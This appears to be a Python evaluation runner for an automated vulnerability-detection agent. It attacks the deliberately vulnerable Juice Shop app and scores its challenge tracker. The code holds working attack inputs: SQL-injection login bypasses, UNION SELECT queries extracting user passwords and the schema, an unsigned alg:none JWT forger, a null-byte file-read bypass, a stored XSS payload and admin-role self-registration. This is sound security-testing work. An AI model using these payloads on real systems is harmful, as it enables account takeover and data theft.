"""Juice Shop live runner — drives detection through MCP, scores the tracker.

Companion to :mod:`reachagent.eval.juiceshop_harness` (the pure metrics layer).
This module holds the *live* half: target setup over HTTP, the MCP-boundary
plumbing (mirrors the Phase 1 VAmPI harness), per-class detection, and scoring
against ``GET /api/Challenges``. Keeping it separate lets the metrics layer stay
importable and unit-testable without httpx or a running Juice Shop.

MCP boundary (§14/§15 DoD): every detection call crosses ``mcp.call_tool`` — the
same dispatch path a Claude Code client hits — never a direct Python call into a
tool function. The runner itself only does target *setup* (login, seeding a
review/feedback) and tracker *scoring* directly over HTTP.
"""

from __future__ import annotations

import asyncio
import base64
import json
from dataclasses import dataclass, field
from itertools import count
from typing import TYPE_CHECKING

import httpx

from reachagent.eval.juiceshop_harness import (
    IN_SCOPE_CLASSES,
    ChallengeResult,
    JuiceshopRun,
    in_scope_class,
    vuln_class_to_scope_class,
)
from reachagent.execution.audit import AuditLog
from reachagent.execution.firer import RequestFirer
from reachagent.execution.scope import ScopeGuard
from reachagent.graph.nodes import Endpoint, Parameter
from reachagent.graph.store import ReachabilityGraph
from reachagent.mcp import server
from reachagent.payloads import PayloadLibrary
from reachagent.tools.explorer_context import ExplorerContext

if TYPE_CHECKING:
    from reachagent.execution.firer import FireResult
    from reachagent.oracles.base import OracleVerdict

_HTTP_TIMEOUT = 15.0


# ---------------------------------------------------------------------------
# Target config
# ---------------------------------------------------------------------------


@dataclass(frozen=True)
class JuiceshopTarget:
    base_url: str

    @property
    def api(self) -> str:
        return self.base_url.rstrip("/")

    @property
    def host(self) -> str:
        return httpx.URL(self.base_url).host


# ---------------------------------------------------------------------------
# Tracker client — reads challenge solved-state from Juice Shop's own API.
# ---------------------------------------------------------------------------


def fetch_tracker(target: JuiceshopTarget) -> dict[str, dict[str, object]]:
    """Return {challenge_key: {category, solved}} from GET /api/Challenges."""
    resp = httpx.get(f"{target.api}/api/Challenges", timeout=_HTTP_TIMEOUT)
    resp.raise_for_status()
    return {
        ch["key"]: {"category": ch["category"], "solved": bool(ch["solved"])}
        for ch in resp.json()["data"]
    }


# ---------------------------------------------------------------------------
# Auth helpers — direct HTTP setup, never part of the detection pipeline.
# ---------------------------------------------------------------------------


def _login(target: JuiceshopTarget, email: str, password: str) -> str | None:
    """Log in and return the JWT bearer token, or None on failure."""
    resp = httpx.post(
        f"{target.api}/rest/user/login",
        json={"email": email, "password": password},
        timeout=_HTTP_TIMEOUT,
    )
    if resp.status_code == 200:
        token = resp.json().get("authentication", {}).get("token")
        return token if isinstance(token, str) else None
    return None


def _register(target: JuiceshopTarget, email: str, password: str) -> int:
    resp = httpx.post(
        f"{target.api}/api/Users",
        json={"email": email, "password": password, "passwordRepeat": password},
        timeout=_HTTP_TIMEOUT,
    )
    return resp.status_code


def _setup_user_token(target: JuiceshopTarget) -> str | None:
    """Register + log in a throwaway account, returning its JWT (setup, direct HTTP).

    Some exploits (the upload endpoint) require an authenticated identity. This is
    target *setup*, explicitly allowed to bypass the MCP boundary (§14/§15) — only
    the detection requests themselves must cross ``mcp.call_tool``.
    """
    email = "reachagent.upload@juice-sh.op"
    password = "Rea!chAgent42"  # noqa: S105 — throwaway eval-target credential, not a secret
    _register(target, email, password)
    return _login(target, email, password)


def _fetch_captcha(target: JuiceshopTarget) -> tuple[int, str]:
    """Return ``(captchaId, answer)`` for the current feedback captcha (setup, direct HTTP).

    The feedback POST requires a solved arithmetic captcha; Juice Shop hands the
    answer back in the same response, so fetching it is legitimate target setup —
    not part of the detection pipeline.
    """
    resp = httpx.get(f"{target.api}/rest/captcha", timeout=_HTTP_TIMEOUT)
    resp.raise_for_status()
    body = resp.json()
    return int(body["captchaId"]), str(body["answer"])


def _forge_none_alg_jwt(email: str) -> str:
    """Build an ``alg:none`` unsigned JWT asserting ``email`` (tagged forgery payload).

    A deterministic tagged payload — no signing key, empty signature — for the
    structural JWT-forgery family (§7). Non-destructive: it only asserts an
    identity to a read-only endpoint; no state is changed.
    """

    def _b64(obj: dict[str, object]) -> str:
        raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        return base64.urlsafe_b64encode(raw).decode("ascii").rstrip("=")

    header = _b64({"typ": "JWT", "alg": "none"})
    payload = _b64({"data": {"email": email}})
    return f"{header}.{payload}."


# ---------------------------------------------------------------------------
# MCP plumbing — mirrors the Phase 1 VAmPI harness exactly.
# ---------------------------------------------------------------------------


@dataclass
class _SharedState:
    graph: ReachabilityGraph = field(default_factory=ReachabilityGraph)
    fires: dict[str, FireResult] = field(default_factory=dict)
    verdicts: dict[str, OracleVerdict] = field(default_factory=dict)
    fire_seq: count[int] = field(default_factory=count)
    verdict_seq: count[int] = field(default_factory=count)


def _session_as(
    target: JuiceshopTarget, token: str | None, shared: _SharedState
) -> server._Session:
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    client = httpx.Client(headers=headers, timeout=_HTTP_TIMEOUT)
    firer = RequestFirer(client, ScopeGuard.from_hosts([target.host]), AuditLog())
    ctx = ExplorerContext(
        graph=shared.graph,
        firer=firer,
        library=PayloadLibrary.from_file(),
        base_url=target.api,
    )
    return server._Session(
        ctx=ctx,
        _fires=shared.fires,
        _verdicts=shared.verdicts,
        _fire_seq=shared.fire_seq,
        _verdict_seq=shared.verdict_seq,
    )


def _mcp_for(sess: server._Session) -> object:
    from mcp.server.fastmcp import FastMCP

    mcp = FastMCP("reachagent-juiceshop-eval")
    server.register_tools(mcp, sess)
    return mcp


def _call(mcp: object, name: str, **arguments: object) -> dict[str, object]:
    _content, structured = asyncio.run(mcp.call_tool(name, arguments))  # type: ignore[attr-defined]
    return dict(structured)


def _fire_get(mcp: object, sess: server._Session, identity: str, path: str) -> str:
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name="probe", location="query"))
    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)
    fired = _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload="",
        method="GET",
    )
    return str(fired["fire_ref"])


def _fire_get_with_origin(
    mcp: object, sess: server._Session, identity: str, path: str, origin: str
) -> str:
    """A read-only GET that carries an attacker ``Origin`` request header.

    Routes through the existing explorer seam: a parameter whose ``location`` is
    ``header`` fires ``headers={name: value}``, so an ``Origin`` header-parameter
    sends the attacker origin without any new firer support. Still a GET — the
    read-only-first invariant holds.
    """
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name="Origin", location="header"))
    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)
    fired = _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=origin,
        method="GET",
    )
    return str(fired["fire_ref"])


def _fingerprint(mcp: object, identity: str, ep: str, param: str) -> None:
    """Run §9 step 1 for a graph param: fire the benign canary, mark it fingerprinted.

    ``fingerprint_parameter`` always fires a *read-only* GET canary
    (``state_changing=False``), never an attack payload, so it does double duty:
    it is the §9 precondition (``fire_request`` refuses any param that has not been
    through here) and, because it is a read-only request to the endpoint, it is
    also the read-only-first case (§10) — once it fires, a later state-changing
    request to the same path is unblocked. No separate read-only "clear" step is
    needed, and no mutation ever happens here.
    """
    _call(mcp, "fingerprint_parameter", identity=identity, endpoint_node=ep, param_node=param)


def _fire_body(
    mcp: object,
    sess: server._Session,
    identity: str,
    path: str,
    param_name: str,
    payload: str,
    *,
    method: str = "POST",
    state_changing: bool = True,
    extra_fields: dict[str, object] | None = None,
) -> dict[str, object]:
    """Fire a single body-param request (JSON object) through MCP; return the raw result.

    Fingerprints the param first (a read-only GET canary), which both satisfies §9
    and clears the read-only-first gate for this path (§10), then fires the real
    request with the caller's ``method``/``state_changing``.
    """
    ep = sess.graph.add_endpoint(Endpoint(method=method, path=path))
    param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="body"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=payload,
        method=method,
        state_changing=state_changing,
        extra_fields=extra_fields or {},
    )


def _fire_query(
    mcp: object, sess: server._Session, identity: str, path: str, param_name: str, payload: str
) -> dict[str, object]:
    """Fire a read-only GET with one query parameter through MCP; return the raw result."""
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="query"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=payload,
        method="GET",
    )


def _fire_path(
    mcp: object,
    sess: server._Session,
    identity: str,
    path_template: str,
    param_name: str,
    payload: str,
) -> dict[str, object]:
    """Fire a read-only GET substituting ``payload`` into a ``{param}`` path slot through MCP."""
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path_template))
    param = sess.graph.add_parameter(ep, Parameter(name=param_name, location="path"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=payload,
        method="GET",
    )


def _fire_header(
    mcp: object,
    sess: server._Session,
    identity: str,
    path: str,
    header_name: str,
    header_value: str,
) -> dict[str, object]:
    """Fire a read-only GET carrying one request header through MCP; return the raw result."""
    ep = sess.graph.add_endpoint(Endpoint(method="GET", path=path))
    param = sess.graph.add_parameter(ep, Parameter(name=header_name, location="header"))
    _fingerprint(mcp, identity, ep, param)
    return _call(
        mcp,
        "fire_request",
        identity=identity,
        endpoint_node=ep,
        param_node=param,
        payload=header_value,
        method="GET",
    )


def _confirm_differential(
    mcp: object,
    *,
    vuln_class: str,
    axis: str,
    expectation: str,
    baseline_ref: str,
    probe_ref: str,
    evidence_ref: str,
    json_field: str | None = None,
) -> bool:
    verdict = _call(
        mcp,
        "run_oracle",
        evidence={
            "axis": axis,
            "expectation": expectation,
            "baseline_fire_ref": baseline_ref,
            "probe_fire_ref": probe_ref,
            "json_field": json_field,
            "evidence_ref": evidence_ref,
        },
    )
    if not verdict.get("is_violation"):
        return False
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
    return True


def _confirm_structural(
    mcp: object,
    *,
    vuln_class: str,
    check_type: str,
    baseline_status: int,
    probe_status: int,
    sentinel: str,
    probe_fire_ref: str,
    evidence_ref: str,
) -> bool:
    verdict = _call(
        mcp,
        "run_oracle",
        mechanism="structural",
        evidence={
            "check_type": check_type,
            "baseline_status": baseline_status,
            "probe_status": probe_status,
            "sentinel": sentinel,
            "probe_fire_ref": probe_fire_ref,
            "evidence_ref": evidence_ref,
        },
    )
    if not verdict.get("is_violation"):
        return False
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
    return True


def _confirm_structural_headers(
    mcp: object,
    *,
    vuln_class: str,
    check_type: str,
    probe_fire_ref: str,
    evidence_ref: str,
    probe_origin: str = "",
    csrf_token_present: bool = False,
) -> bool:
    """Confirm a header-derived structural class (clickjacking / CORS / CSRF).

    The four framing/CORS response headers are resolved server-side from
    ``probe_fire_ref`` (§10/§13) — only the opaque fire handle and the attacker
    ``probe_origin`` we sent cross the wire, never the headers themselves. Also
    serves ``csrf_missing_protection`` whose ``Set-Cookie`` is likewise resolved
    server-side from the fire_ref. On an ``is_violation`` verdict, commits the
    finding via the Validator.
    """
    verdict = _call(
        mcp,
        "run_oracle",
        mechanism="structural",
        evidence={
            "check_type": check_type,
            "probe_fire_ref": probe_fire_ref,
            "probe_origin": probe_origin,
            "csrf_token_present": csrf_token_present,
            "evidence_ref": evidence_ref,
        },
    )
    if not verdict.get("is_violation"):
        return False
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class=vuln_class)
    return True


# ---------------------------------------------------------------------------
# Per-class detection — each runs end to end through MCP.
# ---------------------------------------------------------------------------


def _detect_sqli(target: JuiceshopTarget, token: str | None) -> set[str]:
    """Injection: SQLi auth-bypass on the login POST + UNION/error-based search q=.

    Two technique families, each end-to-end through MCP and oracle-gated:

    * **auth-bypass** — ``POST /rest/user/login``. Baseline is a benign wrong
      credential (correctly refused); each probe is an operator SQLi tautology that
      turns the refusal into a grant. Differential ``auth_bypass``. Login is a
      state-changing auth POST — the read-only-first gate is cleared with a prior
      read-only GET (§10), and ``state_changing=True`` is passed honestly. Only the
      operator's own probe accounts are targeted; no other user's data is touched.
    * **UNION search** — ``GET /rest/products/search?q=``. Baseline a benign term,
      each probe a UNION-select that makes the response diverge. Differential
      ``responses_invariant``.

    Returns the set of ``vuln_class`` strings this run confirmed (``{"sqli"}`` or
    empty) — the scoring seam keys on the real vuln_class, never a per-in-scope-class
    bool.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    confirmed: set[str] = set()

    # --- auth-bypass on the login POST (read-only-first cleared, state-changing) ---
    login_path = "/rest/user/login"
    baseline = _fire_body(
        mcp,
        sess,
        "anon",
        login_path,
        "email",
        "nonexistent@reachagent.invalid",
        extra_fields={"password": "wrong-password"},
    )
    login_probes = (
        ("' OR 1=1--", "sqli/login-any"),
        ("bender@juice-sh.op'--", "sqli/login-bender"),
        ("jim@juice-sh.op'--", "sqli/login-jim"),
    )
    for payload, ref in login_probes:
        probe = _fire_body(
            mcp, sess, "anon", login_path, "email", payload, extra_fields={"password": "x"}
        )
        if _confirm_differential(
            mcp,
            vuln_class="sqli",
            axis="cross_condition",
            expectation="auth_bypass",
            baseline_ref=str(baseline["fire_ref"]),
            probe_ref=str(probe["fire_ref"]),
            evidence_ref=ref,
        ):
            confirmed.add("sqli")

    # --- UNION/error-based injection on the product-search query ---
    search_path = "/rest/products/search"
    search_baseline = _fire_query(mcp, sess, "anon", search_path, "q", "apple")
    union_probes = (
        (
            "qwert')) UNION SELECT id,email,password,4,5,6,7,8,9 FROM Users--",
            "sqli/search-union-users",
        ),
        (
            "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--",
            "sqli/search-union-schema",
        ),
    )
    for payload, ref in union_probes:
        probe = _fire_query(mcp, sess, "anon", search_path, "q", payload)
        if _confirm_differential(
            mcp,
            vuln_class="sqli",
            axis="cross_condition",
            expectation="responses_invariant",
            baseline_ref=str(search_baseline["fire_ref"]),
            probe_ref=str(probe["fire_ref"]),
            evidence_ref=ref,
        ):
            confirmed.add("sqli")

    return confirmed


def _detect_path_traversal(target: JuiceshopTarget, token: str | None) -> set[str]:
    """Path/file access class: forged-JWT acceptance + in-app file-read via /ftp.

    * **JWT forgery** — a tagged ``alg:none`` unsigned token asserting an identity is
      sent to the read-only ``GET /rest/user/whoami``. Baseline is the operator's
      genuine token (accepted); probe is the forgery. Structural ``jwt_forgery``:
      probe accepted where a forgery must be refused → violation.
    * **file read** — ``GET /ftp/{filename}`` with the null-byte extension-filter
      bypass, a pure read-only traversal. Structural ``path_traversal`` sentinel.

    Both are read-only GETs — no state change. Returns the set of ``vuln_class``
    strings confirmed this run — ``jwt_forgery`` and ``path_traversal`` are reported
    *separately*, never collapsed into one bool: ``jwt_forgery`` is an out-of-scope
    (Broken-Auth) class and must not be mis-booked as a ``path_traversal`` FP, and a
    false ``jwt_forgery`` confirmation must never be masked by a ``path_traversal``
    challenge flip.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    confirmed: set[str] = set()

    # --- forged (alg:none) JWT accepted on a read-only identity endpoint ---
    whoami = "/rest/user/whoami"
    if token:
        baseline = _fire_header(mcp, sess, "user", whoami, "Authorization", f"Bearer {token}")
        forged = _forge_none_alg_jwt("jwtn3d@juice-sh.op")
        probe = _fire_header(mcp, sess, "anon", whoami, "Authorization", f"Bearer {forged}")
        if _confirm_structural(
            mcp,
            vuln_class="jwt_forgery",
            check_type="jwt_forgery",
            baseline_status=int(str(baseline.get("status_code", 0))),
            probe_status=int(str(probe.get("status_code", 0))),
            sentinel="",
            probe_fire_ref=str(probe["fire_ref"]),
            evidence_ref="path_traversal/jwt-none",
        ):
            confirmed.add("jwt_forgery")

    # --- in-app file read via /ftp null-byte bypass (read-only traversal) ---
    ftp = "/ftp/{filename}"
    ftp_baseline = _fire_path(mcp, sess, "anon", ftp, "filename", "legal.md")
    # Already-encoded null byte; the path firer re-encodes '%' → the server sees
    # the poison null byte and serves a file past its extension filter.
    ftp_probe = _fire_path(mcp, sess, "anon", ftp, "filename", "package.json.bak%00.md")
    if _confirm_structural(
        mcp,
        vuln_class="path_traversal",
        check_type="path_traversal",
        baseline_status=int(str(ftp_baseline.get("status_code", 0))),
        probe_status=int(str(ftp_probe.get("status_code", 0))),
        sentinel="juice-shop",
        probe_fire_ref=str(ftp_probe["fire_ref"]),
        evidence_ref="path_traversal/ftp-nullbyte",
    ):
        confirmed.add("path_traversal")

    return confirmed


def _detect_file_upload(target: JuiceshopTarget, token: str | None) -> set[str]:
    """Improper-input-validation class: upload-filter bypass + registration/feedback
    validation bypass, all structural ``file_upload_bypass`` (illegitimate input the
    server should reject was accepted with a 2xx).

    * **upload** — ``POST /file-upload``: baseline a legitimate image (accepted),
      probes a disallowed executable type and an oversized file.
    * **registration** — ``POST /api/Users``: baseline a valid registration
      (accepted), probes a mismatched password-repeat, an empty account, and a
      self-assigned admin role.
    * **feedback** — ``POST /api/Feedbacks``: baseline a normal rating, probe a
      zero-star rating the UI forbids. Captchas are solved during setup (direct HTTP).

    Every probe crosses ``mcp.call_tool`` with ``state_changing=True`` after the
    endpoint's read-only-first gate is cleared. Non-destructive: only new throwaway
    rows are created; nothing existing is deleted or altered.
    """
    shared = _SharedState()
    sess = _session_as(target, _setup_user_token(target), shared)
    mcp = _mcp_for(sess)
    confirmed: set[str] = set()

    # --- upload endpoint: disallowed type / oversized file ---
    # One shared param, fired for the baseline and both probes; fingerprint it once
    # (read-only GET canary) to satisfy §9 and clear read-only-first for the path.
    upload_path = "/file-upload"
    up_base_ep = sess.graph.add_endpoint(Endpoint(method="POST", path=upload_path))
    up_base_param = sess.graph.add_parameter(up_base_ep, Parameter(name="file", location="body"))
    _fingerprint(mcp, "user", up_base_ep, up_base_param)
    up_baseline = _call(
        mcp,
        "fire_request",
        identity="user",
        endpoint_node=up_base_ep,
        param_node=up_base_param,
        payload="ok.jpg",
        method="POST",
        state_changing=True,
        upload={"filename": "ok.jpg", "content": "GIF89a", "content_type": "image/jpeg"},
    )
    upload_probes = (
        (
            {"filename": "evil.exe", "content": "MZ", "content_type": "application/octet-stream"},
            "file_upload/type-exe",
        ),
        (
            {"filename": "big.pdf", "content": "A" * 120_000, "content_type": "application/pdf"},
            "file_upload/oversized",
        ),
    )
    for spec, ref in upload_probes:
        probe = _call(
            mcp,
            "fire_request",
            identity="user",
            endpoint_node=up_base_ep,
            param_node=up_base_param,
            payload=str(spec["filename"]),
            method="POST",
            state_changing=True,
            upload=spec,
        )
        if _confirm_structural(
            mcp,
            vuln_class="file_upload",
            check_type="file_upload_bypass",
            baseline_status=int(str(up_baseline.get("status_code", 0))),
            probe_status=int(str(probe.get("status_code", 0))),
            sentinel="",
            probe_fire_ref=str(probe["fire_ref"]),
            evidence_ref=ref,
        ):
            confirmed.add("file_upload")

    # --- registration validation bypass ---
    users_path = "/api/Users"
    reg_baseline = _fire_body(
        mcp,
        sess,
        "anon",
        users_path,
        "email",
        "valid.repeat@reachagent.invalid",
        extra_fields={"password": "Passw0rd!", "passwordRepeat": "Passw0rd!"},
    )
    reg_probes = (
        (
            "mismatch@reachagent.invalid",
            {"password": "aaaaaa", "passwordRepeat": "bbbbbb"},
            "file_upload/register-mismatch",
        ),
        ("", {"password": ""}, "file_upload/register-empty"),
        (
            "admin.self@reachagent.invalid",
            {"password": "Passw0rd!", "passwordRepeat": "Passw0rd!", "role": "admin"},
            "file_upload/register-admin",
        ),
    )
    for email, extra, ref in reg_probes:
        probe = _fire_body(mcp, sess, "anon", users_path, "email", email, extra_fields=extra)
        if _confirm_structural(
            mcp,
            vuln_class="file_upload",
            check_type="file_upload_bypass",
            baseline_status=int(str(reg_baseline.get("status_code", 0))),
            probe_status=int(str(probe.get("status_code", 0))),
            sentinel="",
            probe_fire_ref=str(probe["fire_ref"]),
            evidence_ref=ref,
        ):
            confirmed.add("file_upload")

    # --- feedback rating-validation bypass (zero stars) ---
    feedback_path = "/api/Feedbacks"
    base_cid, base_ans = _fetch_captcha(target)
    fb_baseline = _fire_body(
        mcp,
        sess,
        "anon",
        feedback_path,
        "comment",
        "reachagent baseline feedback",
        extra_fields={"rating": 3, "captchaId": base_cid, "captcha": base_ans},
    )
    probe_cid, probe_ans = _fetch_captcha(target)
    fb_probe = _fire_body(
        mcp,
        sess,
        "anon",
        feedback_path,
        "comment",
        "reachagent zero-star feedback",
        extra_fields={"rating": 0, "captchaId": probe_cid, "captcha": probe_ans},
    )
    if _confirm_structural(
        mcp,
        vuln_class="file_upload",
        check_type="file_upload_bypass",
        baseline_status=int(str(fb_baseline.get("status_code", 0))),
        probe_status=int(str(fb_probe.get("status_code", 0))),
        sentinel="",
        probe_fire_ref=str(fb_probe["fire_ref"]),
        evidence_ref="file_upload/feedback-zero-star",
    ):
        confirmed.add("file_upload")

    return confirmed


def _detect_xss_stored(target: JuiceshopTarget, token: str | None) -> set[str]:
    """XSS: API-reachable stored payload, execution_confirmation via the readback.

    Posts an iframe-javascript payload as a feedback comment and reads it back
    through ``GET /api/Feedbacks``; the execution-confirmation oracle looks for the
    tagged payload in the stored response. Most Juice Shop XSS challenges detect the
    solve in the browser DOM (client-side render), which an API-only agent cannot
    reach — that is an honest ceiling for this class (see the gate report).
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    tag = "XSSREACH42"
    feedback_path = "/api/Feedbacks"
    cid, ans = _fetch_captcha(target)
    _fire_body(
        mcp,
        sess,
        "anon",
        feedback_path,
        "comment",
        f'<iframe src="javascript:{tag}">',
        extra_fields={"rating": 1, "captchaId": cid, "captcha": ans},
    )
    readback = _fire_query(mcp, sess, "anon", feedback_path, "probe", "")
    verdict = _call(
        mcp,
        "run_oracle",
        mechanism="execution_confirmation",
        evidence={
            "payload_tag": tag,
            "probe_fire_ref": str(readback["fire_ref"]),
            "evidence_ref": "xss/feedback-stored",
        },
    )
    if not verdict.get("is_violation"):
        return set()
    _call(mcp, "write_finding", verdict_ref=str(verdict["verdict_ref"]), vuln_class="xss")
    return {"xss"}


def _detect_clickjacking(target: JuiceshopTarget, token: str | None) -> set[str]:
    """Clickjacking: GET the app root, confirm no effective framing defense.

    ``X-Frame-Options`` / CSP ``frame-ancestors`` are read from the captured
    response server-side (resolved from the fire_ref); both absent → framable.
    Read-only GET.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    fire_ref = _fire_get(mcp, sess, "anon", "/")
    confirmed = _confirm_structural_headers(
        mcp,
        vuln_class="clickjacking",
        check_type="clickjacking",
        probe_fire_ref=fire_ref,
        evidence_ref="clickjacking/root",
    )
    return {"clickjacking"} if confirmed else set()


def _detect_cors(target: JuiceshopTarget, token: str | None) -> set[str]:
    """CORS misconfig: GET the app root with an attacker ``Origin`` header.

    Confirms the response reflects that origin in ``Access-Control-Allow-Origin``
    with credentials on (both headers resolved server-side from the fire_ref).
    Read-only GET.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    attacker_origin = "https://evil.example"
    fire_ref = _fire_get_with_origin(mcp, sess, "anon", "/", attacker_origin)
    confirmed = _confirm_structural_headers(
        mcp,
        vuln_class="cors_misconfig",
        check_type="cors_misconfig",
        probe_fire_ref=fire_ref,
        evidence_ref="cors/root",
        probe_origin=attacker_origin,
    )
    return {"cors_misconfig"} if confirmed else set()


def _detect_csrf(target: JuiceshopTarget, token: str | None) -> set[str]:
    """CSRF precondition: GET the app root, confirm the session cookie is
    cross-site-sendable (SameSite=None) with no anti-CSRF token mechanism.

    ``Set-Cookie`` is read from the captured response server-side (resolved from
    the fire_ref). This confirms the structural PRECONDITION only — no forged
    state-change is fired, so read-only-first (§10) holds. Juice Shop exposes no
    anti-CSRF token mechanism, so ``csrf_token_present`` is False.
    """
    shared = _SharedState()
    sess = _session_as(target, token, shared)
    mcp = _mcp_for(sess)
    fire_ref = _fire_get(mcp, sess, "anon", "/")
    confirmed = _confirm_structural_headers(
        mcp,
        vuln_class="csrf_missing_protection",
        check_type="csrf_missing_protection",
        probe_fire_ref=fire_ref,
        evidence_ref="csrf/root",
        csrf_token_present=False,
    )
    return {"csrf_missing_protection"} if confirmed else set()


# ---------------------------------------------------------------------------
# Scoring — per-challenge via a tracker before/after delta.
# ---------------------------------------------------------------------------


def run_juiceshop(target: JuiceshopTarget, *, token: str | None = None) -> JuiceshopRun:
    """Drive all four in-scope detection classes through MCP; score per-challenge.

    Scoring model (per-challenge, not class-to-all):

    * A tracker snapshot is taken **before** and **after** the detection run.
    * ``tracker_solved`` is the challenge's *after* state — Juice Shop's own
      ground truth (§14 invariant 1).
    * ``confirmed`` is attributed per-challenge by the tracker **delta**: a
      challenge is credited to ReachAgent only if it flipped ``unsolved → solved``
      during this run. This is the only honest per-challenge attribution available
      without dedicated per-challenge exploit logic (deferred), and it removes the
      one-detection-marks-all-challenges inflation.

    Each detection function runs entirely through ``mcp.call_tool`` (MCP boundary,
    §14/§15) and returns the set of real ``vuln_class`` strings its oracles confirmed
    this run. The scoring seam keys on that real ``vuln_class`` — never a lossy
    per-in-scope-class bool — so a confirmation is attributed to the class it was
    actually made under (e.g. ``jwt_forgery`` stays distinct from ``path_traversal``).

    False-positive scoring (invariant 2). The oracle verdict discarded by the old
    ``_ = detections`` is now honest signal: for each **in-scope** class whose oracle
    confirmed a finding but where **no** in-scope challenge of that class flipped
    ``unsolved → solved`` this run, we record one *class-level* false positive
    (:attr:`JuiceshopRun.class_false_positives`). An out-of-scope confirmation
    (``jwt_forgery``, ``clickjacking``, ``cors_misconfig``, ``csrf_missing_protection``
    — vuln classes whose tracker categories are not in the four Phase 3
    ``IN_SCOPE_CLASSES``) is neither coverage nor an in-scope FP: it is simply out of
    scope and books nothing. This keeps ``fp_rate`` meaningful instead of structurally
    zero under delta attribution, and it is deliberately kept off the coverage
    denominator.
    """
    before = fetch_tracker(target)

    # Every detector returns the set of vuln_class strings it confirmed. The union
    # is the run's confirmed-vuln_class set, scored by real class in score_run. The
    # three client-side structural detectors (clickjacking/cors/csrf) are included:
    # their vuln classes are out of scope, so score_run books no in-scope FP for
    # them — but they still write findings and are routed through the same
    # out-of-scope rule rather than silently dropped.
    confirmed_vuln_classes: set[str] = set()
    confirmed_vuln_classes |= _detect_sqli(target, token)
    confirmed_vuln_classes |= _detect_path_traversal(target, token)
    confirmed_vuln_classes |= _detect_file_upload(target, token)
    confirmed_vuln_classes |= _detect_xss_stored(target, token)
    confirmed_vuln_classes |= _detect_clickjacking(target, token)
    confirmed_vuln_classes |= _detect_cors(target, token)
    confirmed_vuln_classes |= _detect_csrf(target, token)

    after = fetch_tracker(target)
    return score_run(before, after, confirmed_vuln_classes)


def score_run(
    before: dict[str, dict[str, object]],
    after: dict[str, dict[str, object]],
    confirmed_vuln_classes: set[str],
) -> JuiceshopRun:
    """Build a :class:`JuiceshopRun` from before/after tracker snapshots + oracle signal.

    Pure — no live target — so the per-challenge delta and the class-level
    false-positive rule are unit-testable with synthetic inputs.
    ``confirmed_vuln_classes`` is the set of real ``vuln_class`` strings whose oracle
    confirmed a finding this run (e.g. ``{"sqli", "jwt_forgery"}``).

    Coverage attribution is unchanged: a challenge is credited only if the tracker
    flipped it ``unsolved → solved`` this run (delta), never inflated by a
    confirmation. Class-level FPs are booked only for in-scope classes; a confirmed
    vuln_class that maps out of scope books nothing.
    """
    run = JuiceshopRun()
    flipped_classes: set[str] = set()
    for ch_key, ch_info in after.items():
        scope_class = in_scope_class(str(ch_info["category"]))
        if scope_class is None:
            continue
        solved_after = bool(ch_info["solved"])
        newly_solved = solved_after and not bool(before.get(ch_key, {}).get("solved", False))
        if newly_solved:
            flipped_classes.add(scope_class)
        run.results.append(
            ChallengeResult(
                vuln_class=scope_class,
                challenge_key=ch_key,
                confirmed=newly_solved,
                tracker_solved=solved_after,
            )
        )
    # Map each confirmed vuln_class to its in-scope class; an out-of-scope
    # confirmation (vuln_class_to_scope_class → None) books nothing.
    confirmed_scope_classes = {
        scope
        for vc in confirmed_vuln_classes
        if (scope := vuln_class_to_scope_class(vc)) is not None
    }
    # Class-level false positive: an in-scope class's oracle confirmed but no
    # in-scope challenge of that class flipped this run.
    for scope_class in IN_SCOPE_CLASSES:
        if scope_class in confirmed_scope_classes and scope_class not in flipped_classes:
            run.class_false_positives += 1
    return run
